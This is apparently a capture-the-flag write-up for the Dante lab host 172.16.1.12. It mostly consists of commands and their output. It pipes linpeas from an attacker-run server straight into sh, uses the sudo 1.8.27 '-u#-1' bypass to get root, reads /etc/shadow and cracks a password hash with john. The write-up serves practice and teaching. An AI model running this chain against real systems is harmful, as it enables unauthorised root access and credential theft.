# Privilege Escalation
## 172.16.1.12
```
ben@DANTE-NIX04:~$ sudo -l
Password: Welcometomyblog
Matching Defaults entries for ben on DANTE-NIX04:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User ben may run the following commands on DANTE-NIX04:
    (ALL, !root) /bin/bash
```
```
ben@DANTE-NIX04:~$ cat /etc/passwd |grep /home/
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
mysql:x:999:1001::/home/mysql:/bin/sh
julian:x:1001:1002:Julian,,,:/home/julian:/bin/bash
```
```
ben@DANTE-NIX04:~$ sudo -u julian /bin/bash
julian@DANTE-NIX04:/home/ben$ id
uid=1001(julian) gid=1002(julian) groups=1002(julian)
```

Download `linpeas`
```
$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
```
$ curl -L http://10.10.14.2/linpeas.sh | sh
```
```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                             
Sudo version 1.8.27         
```

Search exploit for sudo
```
$ searchsploit "sudo 1.8.27"
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
sudo 1.8.27 - Security Bypass                                                                                                             | linux/local/47502.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Looking for the exploit code
```
cat /usr/share/exploitdb/exploits/linux/local/47502.py
```
```bash
With ALL specified, user hacker can run the binary /bin/bash as any user

EXPLOIT:

sudo -u#-1 /bin/bash

Example :

hacker@kali:~$ sudo -u#-1 /bin/bash
root@kali:/home/hacker# id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
root@kali:/home/hacker#
```

Try to exploit
```
ben@DANTE-NIX04:~$ sudo -u#-1 /bin/bash
Password: Welcometomyblog
root@DANTE-NIX04:/home/ben# id
uid=0(root) gid=1000(ben) groups=1000(ben)
root@DANTE-NIX04:/home/ben# cat /root/flag.txt
DANTE{sudo_M4k3_me_@_Sandwich}
```
```
$ cat /etc/shadow
```
```
julian:$1$CrackMe$U93HdchOpEUP9iUxGVIvq/:18439:0:99999:7:::
```

Crack julian password
```
$ john julian.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (julian)     
1g 0:00:00:00 DONE (2024-03-03 03:43) 1.388g/s 3888p/s 3888c/s 3888C/s meagan..j123456
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
